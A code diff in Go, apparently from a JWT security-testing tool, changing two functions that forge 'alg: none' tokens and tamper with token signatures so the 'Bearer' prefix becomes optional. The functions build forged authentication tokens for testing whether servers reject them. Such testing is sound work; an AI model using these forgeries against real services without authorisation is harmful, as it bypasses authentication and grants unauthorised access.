@@ -8,11 +8,15 @@ import(
 )
 
 func forgeNoneToken(originalAuthHeader string) (string, error){
+	var token string
+	var prefix string
 	parts := strings.Split(originalAuthHeader, " ")
-	if len(parts) != 2 {
-		return "", fmt.Errorf("invalid auth header format")
+	if len(parts) == 2{
+		prefix = parts[0] + " "
+		token = parts[1]
+	}else{
+		token = originalAuthHeader
 	}
-	token := parts[1]
 	jwtParts := strings.Split(token, ".")
 	if len(jwtParts) != 3 {
 		return "", fmt.Errorf("invalid jwt format")
@@ -40,22 +44,31 @@ func forgeNoneToken(originalAuthHeader string) (string, error){
 	}
 	newPayloadBytes, _ := json.Marshal(payloadMap)
 	newPayloadStr := base64.RawURLEncoding.EncodeToString(newPayloadBytes)
-	forgedToken := fmt.Sprintf("Bearer %s.%s.", newHeaderStr, newPayloadStr)
+	forgedToken := fmt.Sprintf("%s%s.%s.", prefix, newHeaderStr, newPayloadStr)
 	
 	return forgedToken, nil
 }
 
 func tamperSignature(originalAuthHeader string) (string, error) {
+	var token string
+	var prefix string
 	parts := strings.Split(originalAuthHeader, " ")
-	if len(parts) != 2 { return "", fmt.Errorf("invalid auth header") }	
-	jwtParts := strings.Split(parts[1], ".")
-	if len(jwtParts) != 3 { return "", fmt.Errorf("invalid jwt format") }
+	if len(parts) == 2 {
+		prefix = parts[0] + " "
+		token = parts[1]
+	}else{
+		token = originalAuthHeader
+	}
+	jwtParts := strings.Split(token, ".")
+	if len(jwtParts) != 3 { 
+		return "", fmt.Errorf("invalid jwt format") 
+	}	
 	sig := jwtParts[2]
 	if len(sig) > 0 {
 		lastChar := sig[len(sig)-1]
 		newChar := lastChar + 1
 		newSig := sig[:len(sig)-1] + string(newChar)
-		return fmt.Sprintf("Bearer %s.%s.%s", jwtParts[0], jwtParts[1], newSig), nil
+		return fmt.Sprintf("%s%s.%s.%s", prefix, jwtParts[0], jwtParts[1], newSig), nil
 	}
 	return "", fmt.Errorf("signature empty")
 }
